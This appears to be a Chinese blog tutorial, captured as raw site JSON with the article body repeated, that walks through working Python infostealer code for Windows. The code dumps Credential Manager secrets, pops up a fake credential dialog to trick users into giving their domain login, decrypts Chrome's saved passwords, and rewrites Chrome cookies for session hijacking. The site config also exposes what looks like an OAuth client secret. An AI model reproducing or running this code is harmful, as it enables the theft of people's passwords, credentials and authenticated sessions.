class=\"headerlink\" title=\"导入所需要包\"></a>导入所需要包</h3><p>导入所需包和模块，并创建一个常量，用来调用某些凭据管理器相关功能时使用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> io</span><br><span class=\"line\"><span class=\"keyword\">import</span> sqlite3</span><br><span class=\"line\"><span class=\"keyword\">import</span> shutil</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32cred</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32crypt</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32api</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32con</span><br><span class=\"line\"><span class=\"keyword\">import</span> pywintypes</span><br><span class=\"line\"></span><br><span class=\"line\">CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"从windows凭据管理器中存储通用凭据\"><a href=\"#从windows凭据管理器中存储通用凭据\" class=\"headerlink\" title=\"从windows凭据管理器中存储通用凭据\"></a>从windows凭据管理器中存储通用凭据</h3><p>通用凭据是非域凭据。如果你在windows上使用Git并通过GitHub，Bitbucket，Gitlab等进行身份验证，则凭据将存储在CredMan中。</p>\n<p>首先导入枚举和读取凭据所需的功能。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump_credsman_generic</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    CredEnumerate = win32cred.CredEnumerate</span><br><span class=\"line\">    CredRead = win32cred.CredRead</span><br></pre></td></tr></table></figure>\n\n<p>然后，我们枚举存储在凭据管理器中的凭据，并将其放入<code>creds</code>变量中，该变量是一个元组。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    creds = CredEnumerate(<span class=\"literal\">None</span>, <span class=\"number\">0</span>)  <span class=\"comment\"># 枚举凭证</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:  <span class=\"comment\"># 避免在任何异常情况下崩溃</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>现在，我们要遍历每个凭据集，再添加到<code>credentials</code>列表中。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">credentials = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> package <span class=\"keyword\">in</span> creds:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        target = package[<span class=\"string\">'TargetName'</span>]</span><br><span class=\"line\">        creds = CredRead(target, CRED_TYPE_GENERIC)</span><br><span class=\"line\">        credentials.append(creds)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pywintypes.error:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>创建一个内存文本流，避免在磁盘上写文件，遍历<code>credentials</code>变量并将所需的数据写入文本流。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">credman_creds = io.StringIO()  <span class=\"comment\"># 内存中文本流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> cred <span class=\"keyword\">in</span> credentials:</span><br><span class=\"line\">    service = cred[<span class=\"string\">'TargetName'</span>]</span><br><span class=\"line\">    username = cred[<span class=\"string\">'UserName'</span>]</span><br><span class=\"line\">    password = cred[<span class=\"string\">'CredentialBlob'</span>].decode(<span class=\"string\">'utf-8'</span>,<span class=\"string\">'ignore'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Service: '</span> + str(service) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Username: '</span> + str(username) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Password: '</span> + str(password) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> credman_creds.getvalue()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_1.png\" alt=\"3_1\"></p>\n<h3 id=\"询问提示域凭据\"><a href=\"#询问提示域凭据\" class=\"headerlink\" title=\"询问提示域凭据\"></a>询问提示域凭据</h3><p>通过社工方式，用<code>CredUIPromptForCredentials()</code>功能来显示一个对话框来询问用户，从而欺骗用户向我们提供其域凭据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ask_domain_credentials</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials</span><br><span class=\"line\"></span><br><span class=\"line\">    creds = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        creds = CredUIPromptForCredentials(os.environ[<span class=\"string\">'userdomain'</span>], <span class=\"number\">0</span>, os.environ[<span class=\"string\">'username'</span>], <span class=\"literal\">None</span>, <span class=\"literal\">True</span>, CRED_TYPE_GENERIC, &#123;&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> creds</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_2.png\" alt=\"3_2\"></p>\n<p>返回如下格式</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_3.png\" alt=\"3_3\"></p>\n<h3 id=\"存储保存在Chrome中的密码\"><a href=\"#存储保存在Chrome中的密码\" class=\"headerlink\" title=\"存储保存在Chrome中的密码\"></a>存储保存在Chrome中的密码</h3><p>如果在保存凭据时未设置主密码，则访问数据库中的加密<code>Blob</code>可以使用<code>CrytUnprotectData</code>解密(因为windows上的Chrome使用<code>CrytUnprotectData WinAPI</code>函数对其进行加密，<a href=\"https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc\" target=\"_blank\" rel=\"noopener\">参考</a>)，只要它在当前用户上下文中完成即可。这意味着你不能只是获取数据库并在具有不同用户的另一台计算机上打开它。<br>Chrome密码存在Login Data在%localappdata%\\Google\\User Data\\Default\\目录中名为Login Data数据库中。可以用DB Brower看到数据库的结构。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_4.png\" alt=\"3_4\"></p>\n<p>我们想查询：<code>action_urls</code>，<code>username_value</code>和<code>password_value</code>。字段<code>password_value</code>包含一个加密的<code>Blob</code>，我们将使用以下代码对其进行解密。<br>我们先制作数据库文件的本地副本，否则如果当Chrome正在运行，它将带有一个句柄并且数据库将被锁定。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    login_data = os.environ[<span class=\"string\">'localappdata'</span>] + <span class=\"string\">'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data'</span></span><br><span class=\"line\">    shutil.copy2(login_data, <span class=\"string\">'./Login Data'</span>)  <span class=\"comment\"># 复制数据库到当前目录</span></span><br><span class=\"line\">    win32api.SetFileAttributes(<span class=\"string\">'./Login Data'</span>,win32con.FILE_ATTRIBUTE_HIDDEN)  <span class=\"comment\"># 在文件操作过程中不可见</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">chrome_credentials = io.StringIO()</span><br></pre></td></tr></table></figure>\n\n<p>现在，我们使用sqlite3库打开Login Data数据库的本地副本，并查询用户保存凭据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    conn = sqlite3.connect(<span class=\"string\">'./Login Data'</span>, )                                        <span class=\"comment\"># 连接数据库</span></span><br><span class=\"line\">    cursor = conn.cursor()                                                          <span class=\"comment\"># 创建一个游标来获取数据</span></span><br><span class=\"line\">    cursor.execute(<span class=\"string\">'SELECT action_url, username_value, password_value FROM logins'</span>) <span class=\"comment\"># 查询</span></span><br><span class=\"line\">    results = cursor.fetchall()                                                     <span class=\"comment\"># 获取数据</span></span><br><span class=\"line\">    conn.close()                                                                    <span class=\"comment\"># 关闭数据库文件，使其不会被进程锁定</span></span><br><span class=\"line\">    os.remove(<span class=\"string\">'Login Data'</span>)  </span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br></pre></td></tr></table></figure>\n\n<p>遍历获取到的数据并使用WinAPI函数<code>CryptUnprotectData</code>解密密码，最后返回保存好的内存中的文本流。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">    <span class=\"keyword\">for</span> action_url, username_value, password_value <span class=\"keyword\">in</span> results:</span><br><span class=\"line\">        password = win32crypt.CryptUnprotectData(password_value, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"number\">0</span>)[<span class=\"number\">1</span>] <span class=\"comment\"># 使用CryptUnprotectData解密</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> password:                                                                       <span class=\"comment\"># 将凭据写进内存中的文本流</span></span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'URL: '</span> + action_url + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'Username: '</span> + username_value + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'Password: '</span> + str(password) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">            chrome_credentials.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> chrome_credentials.getvalue()                                                   <span class=\"comment\"># 返回内存中的文本流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> sqlite3.OperationalError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_5.png\" alt=\"3_5\"></p>\n<h3 id=\"窃取Chrome-Cookie\"><a href=\"#窃取Chrome-Cookie\" class=\"headerlink\" title=\"窃取Chrome Cookie\"></a>窃取Chrome Cookie</h3><p>Chrome Cookie与存储在Chrome 的密码一样，为同目录下的Cookies文件并用<code>CryptProtectData</code>加密。但不同的是我们使用解密的cookie窃取整个数据库文件重写数据库内部的数据。然后，如果会话在服务器上尚未过期或用户尚未注销，则可以将该数据库上载到远程服务器，并在站点中用于进行身份验证。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">login_data = os.environ[<span class=\"string\">'localappdata'</span>] + <span class=\"string\">'\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies'</span>  <span class=\"comment\"># cookies文件路径</span></span><br><span class=\"line\">shutil.copy2(login_data, <span class=\"string\">'./Cookies'</span>)  <span class=\"comment\"># 复制到当前路径</span></span><br><span class=\"line\">win32api.SetFileAttributes(<span class=\"string\">'./Cookies'</span>, win32con.FILE_ATTRIBUTE_HIDDEN)</span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    conn = sqlite3.connect(<span class=\"string\">'./Cookies'</span>)  <span class=\"comment\"># 连接</span></span><br><span class=\"line\">    cursor = conn.cursor()</span><br><span class=\"line\">    cursor.execute(<span class=\"string\">'SELECT host_key, name, value, encrypted_value FROM cookies'</span>)  <span class=\"comment\"># 查询</span></span><br><span class=\"line\">    results = cursor.fetchall()  <span class=\"comment\"># 获取</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 解密</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> host_key, name, value, encrypted_value <span class=\"keyword\">in</span> results:</span><br><span class=\"line\">        decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"literal\">None</span>, <span class=\"number\">0</span>)[<span class=\"number\">1</span>].decode()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 使用解密的值更新文件</span></span><br><span class=\"line\">        cursor.execute(<span class=\"string\">\"UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?\"</span>，(decrypted_value, host_key, name));</span><br><span class=\"line\"></span><br><span class=\"line\">    conn.commit()  <span class=\"comment\"># 保存改变</span></span><br><span class=\"line\">    conn.close()  <span class=\"comment\"># 关闭文件，使其不被进程锁定</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    print(e)</span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>原cookies文件</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_6.png\" alt=\"3_6\"></p>\n<p>新生成cookies文件</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_7.png\" alt=\"3_7\"></p>\n<p>源代码已上传致[gayhub](<a href=\"https://github.com/yui77111/python-malware/blob/master/credentials\" target=\"_blank\" rel=\"noopener\">https://github.com/yui77111/python-malware/blob/master/credentials</a> and cookies/main.py)</p>\n","site":{"data":{"melody":{"theme_color":{"enable":true,"main":"#2d2d46","paginator":"#9b87b4","button_hover":"#9b87b4","text_selection":"#eebb53","link_color":"#1e1f4a","hr_color":"#ffefbd","tag_start_color":"#ffefbd","tag_end_color":"#c5b1cf"},"menu":{"主站":"/","归档":"/archives","标签":"/tags","分类":"/categories"},"favicon":"/melody-favicon.ico","pwa":{"enable":false,"manifest":"/manifest.json"},"highlight_theme":"ocean","social":{"zhihu fab":"https://www.zhihu.com/people/undefinederror/activities","rss fas":"https://listener1379.site","github fab":"https://github.com/1379Post"},"algolia_search":{"enable":false,"hits":{"per_page":10}},"local_search":{"enable":true,"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}"}},"mathjax":{"enable":true,"cdn":"https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"},"katex":{"enable":false,"cdn":{"css":"https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"}},"fireworks":true,"baidu_analytics":"0535214fe33ef7df8b00f50266abfa7d","google_analytics":null,"tencent_analytics":null,"stylesheets":["/css/index.css"],"scripts":["/js/utils.js","/js/fancybox.js","/js/sidebar.js","/js/copy.js","/js/fireworks.js","/js/transition.js","/js/scroll.js","/js/head.js"],"cdn":{"css":{"fontawesome":"https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css","fontawesomeV5":"https://use.fontawesome.com/releases/v5.3.1/css/all.css"},"js":{"anime":"https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js","jquery":"https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js","fancybox":"https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js","velocity":"https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js","velocity-ui":"https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"}},"avatar":"https://s2.ax1x.com/2019/10/06/ugJeoR.png","top_img":"https://s2.ax1x.com/2019/10/06/ugJCWV.png","post_meta":{"date_type":"created","categories":true,"tags":true},"wordcount":{"enable":true},"toc":{"enable":true,"number":true},"post_copyright":{"enable":true,"license":"CC BY-NC-SA 4.0","license_url":"https://creativecommons.org/licenses/by-nc-sa/4.0/"},"slide":{"separator":"---","separator_vertical":"--","charset":"utf-8","theme":"black","mouseWheel":false,"transition":"slide","transitionSpeed":"default","parallaxBackgroundImage":"","parallaxBackgroundSize":"","parallaxBackgroundHorizontal":null,"parallaxBackgroundVertical":null},"QR_code":[{"itemlist":{"img":"https://i.loli.net/2019/10/10/5O8EnrXMHD4VFct.jpg","text":"支付宝打赏"}},{"itemlist":{"img":"https://i.loli.net/2019/10/10/1iYFIq2ODwrNLCU.png","text":"微信打赏"}}],"adv":{"enable":true,"info":"<div>  </div>"},"addThis":{"enable":false},"disqus":{"enable":false},"gitalk":{"enable":true,"client_id":"7eb42bfb73a159026f1b","client_secret":"3ebfe7728284d8d4c61ac3e789afb034ae2135e4","repo":"1379post.github.io","owner":"1379Post","admin":"1379Post"},"since":9102,"ICP":{"enable":false},"busuanzi":{"enable":true,"site_uv":true,"site_uv_header":"<i class=\"fa fa-user\"></i>","site_uv_footer":null,"site_pv":true,"site_pv_header":"<i class=\"fa fa-eye\"></i>","site_pv_footer":null,"page_pv":true,"page_pv_header":"<i class=\"fa fa-file-o\"></i>","page_pv_footer":null},"links_title":"Links","links":{"Luogu":"https://www.luogu.org","Github":"https://github.com","Zhihu":"https://www.zhihu.com"},"follow":{"enable":true,"url":"https://www.luogu.org/space/show?uid=155907","text":"See me on Luogu"},"google_adsense":{"enable":false,"js":"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js","client":"ca-pub-...........","enable_page_level_ads":true}}}},"excerpt":"","more":"<h3 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h3><p><code>python3</code></p>\n<p><code>pip install pypiwin32</code></p>\n<h3 id=\"导入所需要包\"><a href=\"#导入所需要包\" class=\"headerlink\" title=\"导入所需要包\"></a>导入所需要包</h3><p>导入所需包和模块，并创建一个常量，用来调用某些凭据管理器相关功能时使用。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> io</span><br><span class=\"line\"><span class=\"keyword\">import</span> sqlite3</span><br><span class=\"line\"><span class=\"keyword\">import</span> shutil</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32cred</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32crypt</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32api</span><br><span class=\"line\"><span class=\"keyword\">import</span> win32con</span><br><span class=\"line\"><span class=\"keyword\">import</span> pywintypes</span><br><span class=\"line\"></span><br><span class=\"line\">CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"从windows凭据管理器中存储通用凭据\"><a href=\"#从windows凭据管理器中存储通用凭据\" class=\"headerlink\" title=\"从windows凭据管理器中存储通用凭据\"></a>从windows凭据管理器中存储通用凭据</h3><p>通用凭据是非域凭据。如果你在windows上使用Git并通过GitHub，Bitbucket，Gitlab等进行身份验证，则凭据将存储在CredMan中。</p>\n<p>首先导入枚举和读取凭据所需的功能。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump_credsman_generic</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    CredEnumerate = win32cred.CredEnumerate</span><br><span class=\"line\">    CredRead = win32cred.CredRead</span><br></pre></td></tr></table></figure>\n\n<p>然后，我们枚举存储在凭据管理器中的凭据，并将其放入<code>creds</code>变量中，该变量是一个元组。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    creds = CredEnumerate(<span class=\"literal\">None</span>, <span class=\"number\">0</span>)  <span class=\"comment\"># 枚举凭证</span></span><br><span class=\"line\"><span class=\"keyword\">except</span> Exception:  <span class=\"comment\"># 避免在任何异常情况下崩溃</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>现在，我们要遍历每个凭据集，再添加到<code>credentials</code>列表中。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">credentials = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> package <span class=\"keyword\">in</span> creds:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        target = package[<span class=\"string\">'TargetName'</span>]</span><br><span class=\"line\">        creds = CredRead(target, CRED_TYPE_GENERIC)</span><br><span class=\"line\">        credentials.append(creds)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> pywintypes.error:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\n\n<p>创建一个内存文本流，避免在磁盘上写文件，遍历<code>credentials</code>变量并将所需的数据写入文本流。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">credman_creds = io.StringIO()  <span class=\"comment\"># 内存中文本流</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> cred <span class=\"keyword\">in</span> credentials:</span><br><span class=\"line\">    service = cred[<span class=\"string\">'TargetName'</span>]</span><br><span class=\"line\">    username = cred[<span class=\"string\">'UserName'</span>]</span><br><span class=\"line\">    password = cred[<span class=\"string\">'CredentialBlob'</span>].decode(<span class=\"string\">'utf-8'</span>,<span class=\"string\">'ignore'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Service: '</span> + str(service) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Username: '</span> + str(username) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'Password: '</span> + str(password) + <span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">    credman_creds.write(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> credman_creds.getvalue()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_1.png\" alt=\"3_1\"></p>\n<h3 id=\"询问提示域凭据\"><a href=\"#询问提示域凭据\" class=\"headerlink\" title=\"询问提示域凭据\"></a>询问提示域凭据</h3><p>通过社工方式，用<code>CredUIPromptForCredentials()</code>功能来显示一个对话框来询问用户，从而欺骗用户向我们提供其域凭据。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ask_domain_credentials</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    CredUIPromptForCredentials = win32cred.CredUIPromptForCredentials</span><br><span class=\"line\"></span><br><span class=\"line\">    creds = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        creds = CredUIPromptForCredentials(os.environ[<span class=\"string\">'userdomain'</span>], <span class=\"number\">0</span>, os.environ[<span class=\"string\">'username'</span>], <span class=\"literal\">None</span>, <span class=\"literal\">True</span>, CRED_TYPE_GENERIC, &#123;&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> creds</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_2.png\" alt=\"3_2\"></p>\n<p>返回如下格式</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_3.png\" alt=\"3_3\"></p>\n<h3 id=\"存储保存在Chrome中的密码\"><a href=\"#存储保存在Chrome中的密码\" class=\"headerlink\" title=\"存储保存在Chrome中的密码\"></a>存储保存在Chrome中的密码</h3><p>如果在保存凭据时未设置主密码，则访问数据库中的加密<code>Blob</code>可以使用<code>CrytUnprotectData</code>解密(因为windows上的Chrome使用<code>CrytUnprotectData WinAPI</code>函数对其进行加密，<a href=\"https://chromium.googlesource.com/chromium/chromium/+/master/chrome/browser/password_manager/encryptor_win.cc\" target=\"_blank\" rel=\"noopener\">参考</a>)，只要它在当前用户上下文中完成即可。这意味着你不能只是获取数据库并在具有不同用户的另一台计算机上打开它。<br>Chrome密码存在Login Data在%localappdata%\\Google\\User Data\\Default\\目录中名为Login Data数据库中。可以用DB Brower看到数据库的结构。</p>\n<p><img src=\"https://yui77111.github.io/assets/images/article/python/3_4.png\" 